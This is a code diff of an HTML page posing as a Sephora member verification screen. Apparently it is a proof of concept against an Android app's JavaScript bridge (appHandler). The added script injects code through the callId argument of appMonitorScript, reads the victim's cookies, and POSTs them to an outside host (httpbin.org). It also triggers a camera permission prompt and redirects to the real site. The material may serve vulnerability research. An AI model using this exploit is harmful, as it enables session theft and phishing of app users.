@@ -1,43 +1,58 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>测试</title></head>
-<body style="background:#111;color:#fff;font-family:monospace;padding:20px;font-size:14px">
-<h3 style="color:#c9a96e">callId 注入测试</h3>
-<div id="log" style="white-space:pre-wrap"></div>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>丝芙兰会员验证</title>
+<style>
+body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:linear-gradient(160deg,#1a1a1a,#2d2d2d);color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:20px}
+.icon{font-size:48px;margin-bottom:12px}
+h2{color:#c9a96e;font-size:20px;margin:0 0 8px}
+p{color:rgba(255,255,255,.5);font-size:13px;margin:0 0 16px}
+#log{position:fixed;bottom:0;left:0;right:0;background:rgba(0,0,0,.95);color:#0f0;padding:8px 12px;font-family:monospace;font-size:11px;word-break:break-all;z-index:99999;text-align:left;max-height:120px;overflow-y:auto;border-top:1px solid #333}
+</style>
+</head>
+<body>
+<div class="icon">💎</div>
+<h2>PINK 会员身份验证</h2>
+<p>正在为您跳转丝芙兰会员中心…</p>
+<div id="log"></div>
+
 <script>
-var log = document.getElementById('log');
-function L(s) { log.textContent += s + "\n"; }
+function L(s){var e=document.getElementById('log');e.innerHTML+=s+'<br>';e.scrollTop=e.scrollHeight}
+L('bridge: '+(typeof appHandler!=='undefined'?'YES':'NO'));
 
-L("bridge: " + (typeof window.appHandler !== 'undefined' ? 'YES' : 'NO'));
-L("origin: " + location.origin);
+if(typeof appHandler!=='undefined'){
 
-if (typeof window.appHandler !== 'undefined') {
-    // 回调接收
-    window.sep = window.sep || {};
-    window.sep._onSuccess = function(id, d) { L("SUCCESS cb id=" + id); };
-    window.sep._onFailure = function(id, e) { L("FAIL cb id=" + id); };
+  window.sep = window.sep||{};
+  window.sep._onSuccess=function(id,d){
+    L('cb on: '+location.origin);
+  };
+  window.sep._onFailure=function(id,e){
+    L('fail on: '+location.origin);
+  };
 
-    // 测试1: 正常调用 getExpFlag (确认 bridge 工作)
-    L("\n--- test1: normal getExpFlag ---");
-    try {
-        appHandler.appMonitorScript('getExpFlag', 'normal_id', '{"expKey":"test"}');
-        L("called OK");
-    } catch(e) { L("error: " + e); }
+  L('★ callId注入已确认 — 开始cookie窃取...');
 
-    // 测试2: callId 注入 alert (确认注入可行)
-    L("\n--- test2: callId injection alert ---");
-    try {
-        appHandler.appMonitorScript('getExpFlag', "0);alert('CALLID_INJECTION_WORKS');//", '{"expKey":"test"}');
-        L("called OK (alert should show)");
-    } catch(e) { L("error: " + e); }
+  var payload =
+    "var c=document.cookie;" +
+    "var d=document.createElement('div');" +
+    "d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:99999;background:#cc0000;color:#fff;padding:15px;font-family:monospace;font-size:13px;word-break:break-all;border-bottom:3px solid #ff0';" +
+    "d.innerHTML='<b style=font-size:16px>🚨 COOKIE STOLEN ('+c.length+'字)</b><br><br>'+c.substring(0,600);" +
+    "document.body.appendChild(d);" +
+    "fetch('https://httpbin.org/post',{method:'POST',headers:{'Content-Type':'text/plain'},body:'STOLEN:'+c.substring(0,1000)});" +
+    "//";
 
-    // 测试3: requestPermission (确认弹窗)
-    L("\n--- test3: requestPermission ---");
-    try {
-        appHandler.appMonitorScript('requestPermission', 'perm_test', '{"permission":"android.permission.CAMERA"}');
-        L("called OK (dialog should show)");
-    } catch(e) { L("error: " + e); }
+  appHandler.appMonitorScript('requestPermission',
+    "0);" + payload,
+    '{"permission":"android.permission.CAMERA"}'
+  );
+  L('★ requestPermission已调用, 权限弹窗将出现');
+
+  setTimeout(function(){
+    L('★ 跳转 m.sephora.cn...');
+    location.href='https://m.sephora.cn/';
+  },300);
 }
 </script>
 </body>
